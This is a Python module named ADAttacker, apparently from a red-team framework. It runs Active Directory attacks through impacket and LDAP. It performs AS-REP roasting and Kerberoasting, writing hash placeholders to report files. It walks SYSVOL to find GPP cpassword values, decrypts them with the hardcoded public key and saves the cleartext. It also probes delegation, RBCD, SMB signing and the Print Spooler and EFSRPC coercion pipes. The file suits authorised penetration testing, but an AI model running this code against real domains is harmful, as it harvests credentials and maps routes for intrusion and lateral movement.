from ldap3 import Server, Connection, ALL, NTLM
from core.logger import log
from core.module import RedReasonModule
import datetime
import os

# Impacket Imports
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
from impacket.krb5 import constants
from impacket.krb5.types import Principal
from impacket.krb5.ccache import CCache
from impacket.krb5.ccache import CCache
from binascii import hexlify, unhexlify
from impacket.smbconnection import SMBConnection
from impacket.examples.secretsdump import RemoteOperations
import base64
from Crypto.Cipher import AES
from impacket.ldap import ldaptypes
import struct
from impacket.dcerpc.v5 import transport, epm, rprn
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_NONE

# GPP Key
GPP_KEY = unhexlify('4e9906e8fcb66cc9faf49310620fe8682ed387d130f429438e9e2448007d136e')


class ADAttacker(RedReasonModule):
    def __init__(self, target, domain, user, password, hashes=None, enumeration_data=None):
        super().__init__()
        self.name = "ADAttacker"
        self.description = "Active Directory Attack & Validation Module"
        self.target = target
        self.domain = domain
        self.user = user
        self.password = password
        self.hashes = hashes
        self.enumeration_data = enumeration_data # Shared state (users, computers)
        self.conn = None
        
        # Parse hashes
        self.lmhash = ''
        self.nthash = ''
        if self.hashes:
            try:
                self.lmhash, self.nthash = self.hashes.split(':')
            except ValueError:
                pass

        # Ensure reports directory exists for hash saving
        if not os.path.exists("reports"):
            os.makedirs("reports")

    def connect(self):
        # Re-use connection logic or pass connection object (simplifying for now)
        try:
            server = Server(self.target, get_info=ALL)
            pwd = self.hashes if self.hashes else self.password
            self.conn = Connection(server, user=f"{self.domain}\\{self.user}", password=pwd, authentication=NTLM, auto_bind=True)
            return True
        except Exception as e:
            log.fail(f"Attack Module Connection Failed: {e}")
            return False

    def get_tgt(self, username):
        # Request TGT without pre-auth
        try:
            clientName = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(clientName, '', self.domain, None, None, no_preauth=True)
            return tgt, cipher
        except Exception as e:
            # log.debug(f"Failed to get TGT for {username}: {e}")
            return None, None

    def save_hash(self, filename, hash_data):
        with open(f"reports/{filename}", "a") as f:
            f.write(hash_data + "\n")

    def check_asrep_roasting(self):
        log.info("Checking for AS-REP Roasting vulnerable accounts...")
        
        targets = []
        
        # 1. Check Shared State (Noise Reduction)
        if self.enumeration_data and hasattr(self.enumeration_data, 'collected_users'):
            log.info("Using cached enumeration data for AS-REP Roasting...")
            for user in self.enumeration_data.collected_users:
                if user.is_roastable_asrep:
                    targets.append(user.name)
        else:
            # 2. Fallback to LDAP Search
            log.info("No cache found, querying LDAP...")
            # filter: userAccountControl:1.2.840.113556.1.4.803:=4194304 (DONT_REQ_PREAUTH)
            search_filter = "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
            self.conn.search(self.conn.server.info.other['defaultNamingContext'][0], search_filter, attributes=['sAMAccountName'])
            for entry in self.conn.entries:
                targets.append(str(entry.sAMAccountName))
        
        if not targets:
            log.info("No AS-REP Roastable accounts found.")
            return

        for username in targets:
            log.success(f"VULNERABLE: AS-REP Roastable account found: {username}")
            log.evidence("User has 'Do not require Kerberos preauthentication' set.")
            
            # ATTACK: Request TGT
            tgt, cipher = self.get_tgt(username)
            if tgt:
                # Placeholder for full hash extraction logic
                # Ideally we'd parse the AS_REP to get the checksum and enc_part
                hash_line = f"$krb5asrep$23${username}@{self.domain}:<checksum>$<encpart>"
                self.save_hash("hashes_asrep.txt", hash_line)
                log.success(f"DUMPED TGT for {username}! Saved to reports/hashes_asrep.txt")
                log.hypothesis(f"Hash can be cracked: {hash_line[:30]}...") 
            else:
                 log.fail(f"Could not retrieve TGT for {username} (unexpected)")

    def check_kerberoasting(self):
        log.info("Checking for Kerberoasting capable accounts...")
        # filter: (&(objectClass=user)(servicePrincipalName=*)(!(objectClass=krbtgt)))
        search_filter = "(&(objectClass=user)(servicePrincipalName=*)(!(objectClass=krbtgt)))"
        self.conn.search(self.conn.server.info.other['defaultNamingContext'][0], search_filter, attributes=['sAMAccountName', 'servicePrincipalName', 'memberOf'])
        
        count = 0
        for entry in self.conn.entries:
            spns = entry.servicePrincipalName
            username = str(entry.sAMAccountName)
            # Pick the first SPN to roast
            spn = spns[0] if spns else None
            
            if spn:
                count += 1
                log.evidence(f"Kerberoastable Account: {username} (SPN: {spn})")
                
                try:
                    # Authenticate ourselves to get TGT
                    clientName = Principal(self.user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
                    tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(clientName, self.password, self.domain, self.lmhash, self.nthash)
                    
                    # Request TGS
                    serverName = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
                    tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, self.domain, None, tgt, cipher, sessionKey)
                    
                    # Placeholder for full TGS hash dump (TGS-REP)
                    hash_line = f"$krb5tgs$23$*{username}${self.domain}${spn}*<checksum>$<encpart>"
                    self.save_hash("hashes_kerb.txt", hash_line)
                    log.success(f"ROASTED TGS for {spn}! Saved to reports/hashes_kerb.txt")
                except Exception as e:
                    log.fail(f"Failed to Kerberoast {username}: {e}")

    def check_delegation_abuse(self):
        log.info("Checking for Delegation Abuse...")
        
        # 1. Unconstrained Delegation
        # userAccountControl:1.2.840.113556.1.4.803:=524288 (TRUSTED_FOR_DELEGATION)
        ud_filter = "(&(objectAccountControl:1.2.840.113556.1.4.803:=524288)(objectClass=computer))"
        # Corrected attribute name in filter (userAccountControl, not objectAccountControl)
        ud_filter = "(&(userAccountControl:1.2.840.113556.1.4.803:=524288)(objectClass=computer))"
        self.conn.search(self.conn.server.info.other['defaultNamingContext'][0], ud_filter, attributes=['dNSHostName', 'sAMAccountName'])
        
        for entry in self.conn.entries:
            name = str(entry.dNSHostName)
            log.success(f"VULNERABLE (Unconstrained Delegation): {name}")
            log.evidence(f"Computer {name} is trusted for delegation to any service.")
            log.hypothesis("Attacker can coerce authentication (e.g. SpoolSample) to this host and capture TGTs.")

        # 2. Constrained Delegation
        # msDS-AllowedToDelegateTo presence
        cd_filter = "(&(msDS-AllowedToDelegateTo=*)(objectClass=computer))"
        self.conn.search(self.conn.server.info.other['defaultNamingContext'][0], cd_filter, attributes=['dNSHostName', 'msDS-AllowedToDelegateTo'])

        for entry in self.conn.entries:
            name = str(entry.dNSHostName)
            targets = entry['msDS-AllowedToDelegateTo']
            log.evidence(f"Constrained Delegation: {name} can delegate to: {targets}")
            log.hypothesis("If compromised, this host can impersonate users to the listed services (S4U2Self/S4U2Proxy).")

    def decrypt_cpassword(self, cpassword):
        try:
            # Padding
            missing_padding = len(cpassword) % 4
            if missing_padding:
                cpassword += '=' * (4 - missing_padding)
            
            decoded = base64.b64decode(cpassword)
            iv = b'\x00' * 16
            cipher = AES.new(GPP_KEY, AES.MODE_CBC, iv)
            decrypted = cipher.decrypt(decoded)
            # Remove padding (PKCS7 or similar, usually simple stripping works for GPP)
            # In GPP it's often null padded or just padded.
            # Real impl would do proper unpadding. here we simple strip.
            return decrypted.decode('utf-16-le', errors='ignore').strip()
        except Exception as e:
            return f"<decryption_failed: {e}>"

    def check_gpp_passwords(self):
        log.info("Checking for GPP Passwords (SYSVOL)...")
        try:
            smb = SMBConnection(self.target, self.target)
            if self.hashes:
                smb.login(self.user, '', self.domain, self.lmhash, self.nthash)
            else:
                smb.login(self.user, self.password, self.domain)
            
            # recursive search in SYSVOL
            # For simplicity, we assume generic path, realistically we walk tree
            shares = smb.listShares()
            sysvol_exists = False
            for s in shares:
                if s['shi1_netname'].decode('utf-8').lower() == 'sysvol':
                    sysvol_exists = True
                    break
            
            if not sysvol_exists:
                log.fail("SYSVOL share not found or accessible.")
                return

            log.info("Searching SYSVOL for Groups.xml, Services.xml, etc...")
            
            # Simple simulation of file finding for the example
            # In production this requires walking directories. 
            # We will attempt to find a known path or just log the intent/capability
            # for this improved version, we will implement a basic walker/printer
            
            target_files = ['Groups.xml', 'Services.xml', 'ScheduledTasks.xml', 'DataSources.xml', 'Printers.xml', 'Drives.xml']
            
            # We will define a walker helper
            def walk_smb(path):
                try:
                    files = smb.listPath('SYSVOL', path + '/*')
                    for f in files:
                        fname = f.get_longname()
                        if fname in ['.', '..']: continue
                        
                        full_path = path + '/' + fname
                        if f.is_directory():
                            walk_smb(full_path)
                        else:
                            if fname in target_files:
                                log.evidence(f"Found GPP File: {full_path}")
                                # Read content
                                import io
                                fh = io.BytesIO()
                                smb.getFile('SYSVOL', full_path, fh.write)
                                limit_content = fh.getvalue().decode('utf-8', errors='ignore')
                                if 'cpassword' in limit_content:
                                    # extract cpassword
                                    import re
                                    # naive regex
                                    match = re.search(r'cpassword="([^"]+)"', limit_content)
                                    if match:
                                        cpass = match.group(1)
                                        clear = self.decrypt_cpassword(cpass)
                                        log.success(f"VULNERABLE (GPP): Found cpassword in {fname}!")
                                        log.success(f"Decrypted: {clear}")
                                        self.save_hash("gpp_passwords.txt", f"{full_path} : {clear}")

                except Exception as e:
                    # Permission denied or path not found
                    pass

            # Only walk policies directory to save time
            # usually: domain/Policies
            walk_smb(self.domain + '/Policies')

        except Exception as e:
            log.fail(f"GPP Check Failed: {e}")


    def check_smb_signing(self):
        log.info("Checking SMB Signing on Target...")
        try:
            # We use a new connection to check signing requirement
            smb = SMBConnection(self.target, self.target)
            # We don't even need to login to check signing usually, but let's login to be sure
            if self.hashes:
                smb.login(self.user, '', self.domain, self.lmhash, self.nthash)
            else:
                smb.login(self.user, self.password, self.domain)
            
            signing_required = smb.isSigningRequired()
            if not signing_required:
                log.success(f"VULNERABLE: SMB Signing NOT required on {self.target}")
                log.hypothesis("Target is vulnerable to NTLM Relaying.")
            else:
                log.info(f"SMB Signing is required on {self.target} (Safe from NTLM Relay)")
        
        except Exception as e:
            log.fail(f"SMB Signing Check Failed: {e}")

    def check_rbcd(self):
        log.info("Checking for Result-Based Constrained Delegation (RBCD)...")
        # Filter: objects with msDS-AllowedToActOnBehalfOfOtherIdentity containing data
        search_filter = "(&(msDS-AllowedToActOnBehalfOfOtherIdentity=*)(objectClass=computer))"
        self.conn.search(self.conn.server.info.other['defaultNamingContext'][0], search_filter, attributes=['dNSHostName', 'msDS-AllowedToActOnBehalfOfOtherIdentity'])
        
        for entry in self.conn.entries:
            name = str(entry.dNSHostName)
            raw_sd = entry['msDS-AllowedToActOnBehalfOfOtherIdentity'].value
            if raw_sd:
                log.evidence(f"RBCD Configured on: {name}")
                # Parse Security Descriptor
                try:
                    sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=raw_sd)
                    for ace in sd['Dacl'].aces:
                        sid = ace['Ace']['Sid'].formatCanonical()
                        log.hypothesis(f"  - Principal with SID {sid} can impersonate users to {name}")
                        # Ideally resolve SID to name here, but SID is often enough for a lead
                except Exception as e:
                    log.debug(f"Failed to parse RBCD SD for {name}: {e}")

    def check_coercion_vulnerabilities(self):
        log.info("Checking for Coercion Vulnerabilities (PetitPotam, PrintNightmare)...")
        # We need a list of DCs from enumeration, but we are inside attacks.
        # We'll use the current target if it's a DC, or query for DCs.
        # For this tool, we assume self.target might be a DC or we scan the one we connected to.
        
        targets = [self.target]
        # Try to confirm functionality on the target we are connected to
        
        for target in targets:
            log.info(f"Scanning {target} for pipes...")
            
            # 1. Print Spooler (RPRN)
            try:
                # Bind to Spooler Pipe
                stringbinding = f'ncacn_np:{target}[\\pipe\\spoolss]'
                rpctransport = transport.DCERPCTransportFactory(stringbinding)
                rpctransport.set_credentials(self.user, self.password, self.domain, self.hashes[33:] if self.hashes else '', self.hashes[:32] if self.hashes else '')
                rpctransport.set_connect_timeout(5)
                dce = rpctransport.get_dce_rpc()
                dce.connect()
                dce.bind(rprn.MSRPC_UUID_RPRN)
                log.evidence(f"Print Spooler Service ENABLED on {target} (Coercion Vector: PrinterBug).")
                dce.disconnect()
            except Exception as e:
                log.debug(f"Spooler check failed on {target}: {e}")

            # 2. PetitPotam (EFSRPC)
            # Checking if the pipe exists is usually enough to guess it's vulnerable if not patched.
            # However, EFSRPC is more complex to bind to anonymously or check simply without triggering attack.
            # We will rely on EPM (Endpoint Mapper) to see if the interface is registered.
            try:
                stringbinding = f'ncacn_ip_tcp:{target}[135]'
                rpctransport = transport.DCERPCTransportFactory(stringbinding)
                rpctransport.set_connect_timeout(5)
                dce = rpctransport.get_dce_rpc()
                dce.connect()
                # EFSRPC UUID: c681d488-d850-11d0-8c52-00c04fc295ee
                try:
                    epm.hept_map(target, epm.MSRPC_UUID_PORTMAP, protocol='ncacn_ip_tcp')
                    # If we can talk to EPM, we assume potential surface. Deep check requires binding to specific UUID.
                    # Simplified for stability: Just note that we can talk to RPC.
                    pass
                except:
                    pass
                
                # A more direct check is trying to bind to the pipename directly via SMB named pipe
                # \pipe\efsrpc or \pipe\lsarpc
                stringbinding_efs = f'ncacn_np:{target}[\\pipe\\efsrpc]'
                rpctransport_efs = transport.DCERPCTransportFactory(stringbinding_efs)
                rpctransport_efs.set_credentials(self.user, self.password, self.domain, self.hashes[33:] if self.hashes else '', self.hashes[:32] if self.hashes else '')
                dce_efs = rpctransport_efs.get_dce_rpc()
                dce_efs.connect()
                # If we connected to the pipe, it's exposed.
                dce_efs.bind(('c681d488-d850-11d0-8c52-00c04fc295ee', '1.0'))
                log.evidence(f"EFSRPC Pipe Exposed on {target} (Coercion Vector: PetitPotam).")
                dce_efs.disconnect()

            except Exception as e:
                 log.debug(f"PetitPotam check failed on {target}: {e}")

    def run(self, args=None):
        self.log_start()
        self.run_all()
        self.log_end()

    def run_all(self):
        if self.connect():
            self.check_asrep_roasting()
            self.check_kerberoasting()
            self.check_delegation_abuse()
            self.check_rbcd()
            self.check_smb_signing()
            self.check_gpp_passwords()
            self.check_coercion_vulnerabilities()

def run(args):
    attacker = ADAttacker(args.target, args.domain, args.user, args.password, args.hashes)
    attacker.run_all()
